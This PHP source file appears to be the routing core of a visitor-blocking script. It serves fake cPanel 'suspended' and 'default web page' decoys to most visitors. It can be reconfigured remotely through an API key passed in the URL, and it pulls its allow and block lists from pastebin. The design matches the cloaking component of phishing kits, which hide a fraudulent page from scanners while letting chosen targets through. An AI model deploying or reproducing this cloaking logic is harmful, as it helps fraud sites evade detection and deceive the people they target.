<?php
require __DIR__ . '/function.php';

if (isset($_GET['edit']) && isset($_GET['apikey']) && isset($_GET['config'])) {
  if ($api->config("apikey") == $_GET['apikey']) {
    $json = json_decode(file_get_contents($api->file_config), true);
    $data['apikey'] = $_GET['apikey'];
    $data['config'] = json_decode($_GET['config']);
    array_push($json['config'], $data['config']);
    $config = json_encode($data);
    $api->save($api->file_config, $config, "w");
  }
}
if (isset($_GET['reset']) && isset($_GET['apikey'])) {
  if ($api->config("apikey") == $_GET['apikey']) {
    if ($_GET['reset'] == "allow") {
      $file = $api->dir_logs.'/'.$api->logs_allow;
      $allow = $api->get("https://pastebin.com/raw/sEbzrNED")['data'];
      @unlink($file);
      $api->save($file, $allow, "w");
    } elseif ($_GET['reset'] == "block") {
      $file = $api->dir_logs.'/'.$api->logs_block;
      $block = $api->get("https://pastebin.com/raw/wzZ4bPCp")['data'];
      @unlink($file);
      $api->save($file, $block, "w");
    }
  }
}
if (isset($_GET['block'])) {
  $api->ngeblock("error");
} elseif (isset($_GET['success'])) {
  $api->ngeblock("official");
} else if (isset($_GET['code'])) {
  if ($_GET['code'] == 1) {
    if ($_SERVER['REQUEST_URI'] == "/cgi-sys/suspendedpage.cgi") {
      $api->error(1);
    } else {
      $api->redirect("/cgi-sys/suspendedpage.cgi");
    }
  } elseif ($_GET['code'] == 2) {
    if ($_SERVER['REQUEST_URI'] == "/cgi-sys/defaultwebpage.cgi") {
      $api->error(2);
    } else {
      $api->redirect("/cgi-sys/defaultwebpage.cgi");
    }
  } else {
    $api->error(3);
  }
} else {
  if (empty($_SESSION['error'])) {
    $_SESSION['error'] = rand(1,3);
  }
  if ($_SESSION['error'] == 1) {
    if ($_SERVER['REQUEST_URI'] == "/cgi-sys/suspendedpage.cgi") {
      $api->error(1);
    } else {
      $api->redirect("/cgi-sys/suspendedpage.cgi");
    }
  } elseif ($_SESSION['error'] == 2) {
    if ($_SERVER['REQUEST_URI'] == "/cgi-sys/defaultwebpage.cgi") {
      $api->error(2);
    } else {
      $api->redirect("/cgi-sys/defaultwebpage.cgi");
    }
  } else {
    $api->error(3);
  }
}
?>
